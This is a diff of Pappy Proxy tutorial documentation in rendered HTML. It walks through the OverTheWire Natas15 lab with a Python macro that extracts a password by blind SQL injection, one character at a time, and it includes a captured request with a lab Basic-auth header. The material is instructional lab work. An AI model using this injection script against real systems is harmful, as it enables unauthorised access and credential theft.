-    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;natas16&quot; AND ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) = </span><span class="si">%d</span><span class="s">; #&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;natas16&quot; AND ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s1">, 1)) = </span><span class="si">%d</span><span class="s1">; #&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
     <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
     <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span>
-    <span class="k">if</span> <span class="s">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s2">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">False</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">True</span>
 
 <span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
-    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890&quot;</span>
+    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890&quot;</span>
     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">valid_chars</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&#39;Trying </span><span class="si">%s</span><span class="s">...&#39;</span> <span class="o">%</span> <span class="n">c</span>
+        <span class="k">print</span> <span class="s1">&#39;Trying </span><span class="si">%s</span><span class="s1">...&#39;</span> <span class="o">%</span> <span class="n">c</span>
         <span class="k">if</span> <span class="n">check_char</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
-            <span class="k">print</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> is the first char!&#39;</span> <span class="o">%</span> <span class="n">c</span>
+            <span class="k">print</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1"> is the first char!&#39;</span> <span class="o">%</span> <span class="n">c</span>
             <span class="k">return</span>
-    <span class="k">print</span> <span class="s">&quot;The script didn&#39;t work&quot;</span>
+    <span class="k">print</span> <span class="s2">&quot;The script didn&#39;t work&quot;</span>
 </pre></div>
 </div>
 <p>And when we run it...:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; lma
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; lma
 Loaded &quot;&lt;Macro Macro 41855887 (brute)&gt;&quot;
 pappy&gt; rma brute
 Trying a...
@@ -689,78 +689,78 @@ pappy&gt;
 </pre></div>
 </div>
 <p>We find the first character! Woo! Next we just have to do this for each position. Even through we don&#8217;t know the length of the password, we will know that the password is over when none of the characters are valid. So let&#8217;s update our macro:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">sys</span>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
 <span class="kn">from</span> <span class="nn">pappyproxy.context</span> <span class="kn">import</span> <span class="n">set_tag</span>
 
-<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s">&#39;Macro 41855887&#39;</span>
-<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s1">&#39;Macro 41855887&#39;</span>
+<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 
-<span class="c">###########</span>
-<span class="c">## Requests</span>
-<span class="c"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
-<span class="c"># as needed to create modified requests</span>
-<span class="c">##</span>
+<span class="c1">###########</span>
+<span class="c1">## Requests</span>
+<span class="c1"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
+<span class="c1"># as needed to create modified requests</span>
+<span class="c1">##</span>
 
 
 <span class="n">req1</span> <span class="o">=</span> <span class="n">Request</span><span class="p">((</span>
-    <span class="s">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;username=admin&#39;</span>
+    <span class="s1">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;username=admin&#39;</span>
 <span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">check_char</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;natas16&quot; AND ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) = </span><span class="si">%d</span><span class="s">; #&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;natas16&quot; AND ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s1">, 1)) = </span><span class="si">%d</span><span class="s1">; #&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
     <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
     <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span>
-    <span class="k">if</span> <span class="s">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s2">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">False</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">True</span>
 
 <span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
-    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890&quot;</span>
-    <span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890&quot;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
     <span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>
     <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="n">done</span> <span class="o">=</span> <span class="bp">True</span>
         <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">valid_chars</span><span class="p">:</span>
-            <span class="c"># Print the current char to the current line</span>
+            <span class="c1"># Print the current char to the current line</span>
             <span class="k">print</span> <span class="n">c</span><span class="p">,</span>
             <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
 
-            <span class="c"># Check the current char</span>
+            <span class="c1"># Check the current char</span>
             <span class="k">if</span> <span class="n">check_char</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
-                <span class="c"># We got the correct char!</span>
+                <span class="c1"># We got the correct char!</span>
                 <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
-                <span class="c"># Print it to the screen</span>
-                <span class="k">print</span> <span class="s">&#39;&#39;</span>
-                <span class="k">print</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> is char </span><span class="si">%d</span><span class="s">!&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
-                <span class="k">print</span> <span class="s">&#39;The password so far is </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">password</span>
-                <span class="c"># We have to do another round</span>
+                <span class="c1"># Print it to the screen</span>
+                <span class="k">print</span> <span class="s1">&#39;&#39;</span>
+                <span class="k">print</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1"> is char </span><span class="si">%d</span><span class="s1">!&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+                <span class="k">print</span> <span class="s1">&#39;The password so far is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">password</span>
+                <span class="c1"># We have to do another round</span>
                 <span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>
                 <span class="k">break</span>
         <span class="k">if</span> <span class="n">done</span><span class="p">:</span>
-            <span class="c"># We got through the entire alphabet</span>
-            <span class="k">print</span> <span class="s">&#39;&#39;</span>
-            <span class="k">print</span> <span class="s">&#39;Done! The password is &quot;</span><span class="si">%s</span><span class="s">&quot;&#39;</span> <span class="o">%</span> <span class="n">password</span>
+            <span class="c1"># We got through the entire alphabet</span>
+            <span class="k">print</span> <span class="s1">&#39;&#39;</span>
+            <span class="k">print</span> <span class="s1">&#39;Done! The password is &quot;</span><span class="si">%s</span><span class="s1">&quot;&#39;</span> <span class="o">%</span> <span class="n">password</span>
             <span class="k">break</span>
 </pre></div>
 </div>
 <p>Then we run it:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; lma
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; lma
 Loaded &quot;&lt;Macro Macro 41855887 (brute)&gt;&quot;
 pappy&gt; rma brute
 a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W
@@ -893,12 +893,12 @@ pappy&gt;
         <li class="right" >
           <a href="overview.html" title="The Pappy Proxy"
              >previous</a> |</li>
-        <li class="nav-item nav-item-0"><a href="index.html">Pappy Proxy 0.2.1 documentation</a> &raquo;</li> 
+        <li class="nav-item nav-item-0"><a href="index.html">Pappy Proxy 0.2.11 documentation</a> &raquo;</li> 
       </ul>
     </div>
     <div class="footer" role="contentinfo">
         &copy; Copyright 2015, Rob Glew.
-      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.3.3.
+      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.3.6.
     </div>
   </body>
 </html>
